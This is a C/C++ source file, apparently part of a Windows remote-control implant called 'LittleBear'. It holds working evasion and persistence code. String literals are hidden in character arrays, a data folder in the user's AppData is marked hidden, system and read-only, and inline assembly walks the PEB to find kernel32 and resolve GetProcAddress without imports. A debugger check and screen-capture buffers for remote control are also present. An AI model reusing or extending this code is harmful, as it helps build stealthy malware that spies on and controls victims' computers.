#include <windows.h>
#include "PublicVar.h"
#include "FileOperator.h"
#include <DbgHelp.h>
#include "function/BasicDeviceInfo.h"

#define WSASTARTUP_VERSION 0X0202


int InitWindowsSocket()
{
	WSADATA stWsa = { 0 };
	int iRet = lpWSAStartup(WSASTARTUP_VERSION, &stWsa);
	if (iRet)
	{
		WriteLittleBearLog("InitWindowsSocket lpWSAStartup error\r\n");
		return FALSE;
	}
	return TRUE;
}




HANDLE  CheckInstanceExist(char * lpmutexname, BOOL * exist)
{
	HANDLE h = lpCreateMutexA(NULL, TRUE, "Global_littlebearmutex");
	DWORD dwRet = lpRtlGetLastWin32Error();
	if (h)
	{
		if (ERROR_ALREADY_EXISTS == dwRet)
		{
			*exist = TRUE;
			return h;
		}
		else if (dwRet == FALSE)
		{
			*exist = FALSE;
			return h;
		}
		else
		{
			*exist = FALSE;
			return h;
		}
	}
	else {
		*exist = FALSE;
		return FALSE;
	}
}


int getRunningPath() {
	int iRet = 0;
	if (*strUserName == 0)
	{
		GetUserAndComputerName(strUserName, strComputerName);
	}

	char szPEFilePathWin7Format[] = { 'c',':','\\','u','s','e','r','s','\\','%','s','\\','a','p','p','d','a','t','a','\\',
		'l','o','c','a','l','\\','%','s','\\',0 };
	char szPEFilePathWin7[MAX_PATH];
	lpwsprintfA(szPEFilePathWin7, szPEFilePathWin7Format, strUserName, LITTLEBEARNAME);

	char szPEFilePathFormat[] = { 'C',':',0x5c,'D','o','c','u','m','e','n','t','s',' ','a','n','d',' ','S','e','t','t','i','n','g','s',
		0x5c,'%','s',0x5c,'L','o','c','a','l',' ','S','e','t','t','i','n','g','s',0x5c,'%','s','\\',0 };
	char szPEFilePath[MAX_PATH];
	lpwsprintfA(szPEFilePath, szPEFilePathFormat, strUserName, LITTLEBEARNAME);

	if (*szSysDir == 0)
	{
		GetSystemDir(szSysDir);
	}
	szPEFilePathWin7[0] = szSysDir[0];
	szPEFilePath[0] = szSysDir[0];

	if (iSystemVersion == 0)
	{
		iCpuBits = GetCpuBits();
		iSystemVersion = GetWindowsVersion(strSysVersion);
	}

	if (iSystemVersion >= SYSTEM_VERSION_VISTA)
	{
		lplstrcpyA(strDataPath, szPEFilePathWin7);
	}
	else
	{
		lplstrcpyA(strDataPath, szPEFilePath);
	}
	return 0;
}



int CheckAndCreateDataPath()
{
	int iRet = 0;
	iRet = getRunningPath();
	//FILE_FLAG_BACKUP_SEMANTICS is for folder to open and operation
	iRet = FileOperator::CheckPathExist(string(strDataPath));
	if (iRet == FALSE) {
		iRet = MakeSureDirectoryPathExists(strDataPath);
		if (iRet == 0)
		{
			int iError = lpRtlGetLastWin32Error();
			if (iError == ERROR_ALREADY_EXISTS || iError == 5)
			{
				iRet = lpSetFileAttributesA(strDataPath, FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_READONLY | FILE_ATTRIBUTE_SYSTEM);
				return TRUE;
			}
			else
			{
				WriteLittleBearRawLog("CreateCurrentDirDataPath lpCreateDirectoryA error\r\n");
				return FALSE;
			}
		}
		else
		{
			iRet = lpSetFileAttributesA(strDataPath, FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_READONLY | FILE_ATTRIBUTE_SYSTEM);
			return TRUE;
		}
	}
	else
	{
		iRet = lpSetFileAttributesA(strDataPath, FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_READONLY | FILE_ATTRIBUTE_SYSTEM);
		return TRUE;
	}

	return FALSE;
}


int InitDisplayParam(int * JPG_STREAM_SIZE, int * BMP_STREAM_SIZE, int * REMOTECONTROL_BUFFER_SIZE) {
	DEVMODE devmode = { 0 };
	devmode.dmSize = sizeof(DEVMODE);
	BOOL Isgetdisplay = EnumDisplaySettings(NULL, ENUM_CURRENT_SETTINGS, &devmode);
	if (Isgetdisplay == FALSE)
	{
		return FALSE;
	}

	ScrnResolutionX = devmode.dmPelsWidth;
	ScrnResolutionY = devmode.dmPelsHeight;

	int widthmod = 32 - (devmode.dmPelsWidth  * BITSPERPIXEL) % 32;
	int width = 0;
	if (widthmod)
	{
		width = (devmode.dmPelsWidth  * BITSPERPIXEL + widthmod) / 8;
	}
	else {
		width = (devmode.dmPelsWidth  * BITSPERPIXEL) / 8;
	}
	*BMP_STREAM_SIZE = width * devmode.dmPelsHeight + 0x1000;
	//4:1 8:1 16:1
	*JPG_STREAM_SIZE = *BMP_STREAM_SIZE / 2;


	int remotewidthmod = 32 - (devmode.dmPelsWidth  * REMOTEBMP_BITSPERPIXEL) % 32;
	int remotewidth = 0;
	if (remotewidthmod)
	{
		remotewidth = (devmode.dmPelsWidth  * REMOTEBMP_BITSPERPIXEL + remotewidthmod) / 8;
	}
	else {
		remotewidth = (devmode.dmPelsWidth  * REMOTEBMP_BITSPERPIXEL ) / 8;
	}

	*REMOTECONTROL_BUFFER_SIZE = remotewidth * devmode.dmPelsHeight + 0x1000;

	int dpi = 0;
	if (iSystemVersion >= SYSTEM_VERSION_VISTA)
	{
		dpi = lpIsProcessDPIAware();
		if (dpi == FALSE && iSystemVersion >= SYSTEM_VERSION_VISTA)
		{
			dpi = lpSetProcessDPIAware();
		}
	}

	return TRUE;
}



HMODULE GetDllKernel32Base()
{
#ifndef _WIN64
	HMODULE hKernel32 = 0;
	__asm
	{
		//assume fs:nothing
		push esi
		xor eax, eax
		mov eax, fs:[eax + 30h]; 指向PEB的指针
		mov eax, [eax + 0ch]; 指向PEB_LDR_DATA的指针
		mov esi, [eax + 0ch]; 根据PEB_LDR_DATA得出InLoadOrderModuleList的Flink字段
		lodsd
		mov eax, [eax]; 指向下一个节点
		mov eax, [eax + 18h]; Kernel.dll的基地址
		mov hKernel32, eax
		pop esi
	}

	return hKernel32;
#else
	char szKernel32[] = { 'k','e','r','n','e','l','3','2','.','d','l','l',0 };
	return GetModuleHandleA(szKernel32);

#endif
}




FARPROC getGetProcAddress(HMODULE hKernel32)
{
	char szGetProcAdress[] = { 'G','e','t','P','r','o','c','A','d','d','r','e','s','s',0 };
#ifndef _WIN64
	FARPROC pGetProcAddr = 0;
	__asm
	{
		pushad
		mov edi, hKernel32

		mov eax, [edi + 3ch]

		mov edx, [edi + eax + 78h]		//export rva

		add edx, edi

		mov ecx, [edx + 18h]			//numberOfNames

		mov ebx, [edx + 20h]			//AddressOfNames of rva

		add ebx, edi					//AddressOfNames

		search :
		push ecx

		push edx
		push ebx

		push edi

		mov esi, [ebx + ecx * 4]		//function name rva

		add esi, edi					//function name address


		push esi
		lea eax, szGetProcAdress
		push eax
		call lstrcmpiA					//stdcall

		pop edi
		pop ebx
		pop edx

		pop ecx

		cmp eax,0
		jz _findAddress
		loop search

		jmp _notFoundAdress

		_findAddress:

		mov ebx, [edx + 24h]			//AddressOfNameOrdinals

		add ebx, edi

		movzx ecx,WORD PTR  [ebx + ecx * 2]

		mov ebx, [edx + 1ch]			//addressOfFunctions

		add ebx, edi

		mov eax, [ebx + ecx * 4]

		add eax, edi

		mov pGetProcAddr, eax
		jmp _searchEnd

		_notFoundAdress:
		mov eax,0
		mov pGetProcAddr, eax

		_searchEnd:
		popad
	}

	return  pGetProcAddr;

#else
	return (FARPROC)GetProcAddress;
#endif
}



int  PebNtGlobalFlagsApproach()
{
	return IsDebuggerPresent();

#ifndef _WIN64
	int result = 0;
	__asm
	{
		// 进程的PEB
		mov eax, fs:[30h]
		// 控制堆操作函数的工作方式的标志位
		mov eax, [eax + 68h]
		// 操作系统会加上这些标志位FLG_HEAP_ENABLE_TAIL_CHECK, 
		// FLG_HEAP_ENABLE_FREE_CHECK and FLG_HEAP_VALIDATE_PARAMETERS，
		// 它们的并集就是x70
		// 下面的代码相当于C/C++的
		// eax = eax & 0x70
		and eax, 0x70
		mov result, eax
	}

	return result != 0;
#else
	return IsDebuggerPresent();
#endif
}